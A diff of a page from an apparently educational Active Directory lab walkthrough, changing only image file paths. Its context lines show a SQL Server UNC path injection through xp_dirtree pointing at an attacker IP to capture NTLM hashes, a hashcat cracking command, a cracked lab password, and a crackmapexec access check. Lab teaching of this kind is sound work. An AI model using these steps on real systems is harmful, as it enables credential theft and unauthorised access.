@@ -91,7 +91,7 @@ Get-SQLQuery -Query "EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1" -Instance web0
 
 The part `EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1` is the SQL query which will execute the UNC PATH injection attack. After executing the command we receive the hash of the computeraccount on our kali machine:
 
-![](<../../../.gitbook/assets/image (10).png>)
+![](<../../../.gitbook/assets/image (10) (1).png>)
 
 Since its a computer account hash we wont be able to crack it. How do we know its a computer account hash? Computer accounts ends with a Dollar sign $. We could always double check by quering the domain and check if its a computer of normal user or search it up in the bloodhound data.
 
@@ -99,7 +99,7 @@ Since its a computer account hash we wont be able to crack it. How do we know it
 
 Now lets capture the hash of the DATA01 SQL server service. Relaying the SQL Server hash isn't implemented in the lab yet, but we can crack the hash of the SQL server service. During the SQL Server installation on `DATA01` we configured it to run as the domain user `sa_sql`.
 
-![](<../../../.gitbook/assets/image (31).png>)
+![](<../../../.gitbook/assets/image (31) (1).png>)
 
 We will start of from having access to the SQL database running on `DATA01` using PowerUpSQL. Check out this page if you forgot how we got access.
 
@@ -136,7 +136,7 @@ hashcat -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt
 
 Hashcat cracked it within second since the user has a weak password:
 
-![](<../../../.gitbook/assets/image (70).png>)
+![](<../../../.gitbook/assets/image (70) (1).png>)
 
 4\. The password for `sa_sql` is `IIoveyou2`. We can check if we can access the SQL Server with this account using crackmapexec, which will authenticate over SMB. If it shows Pwn3d we are localadmin.
 
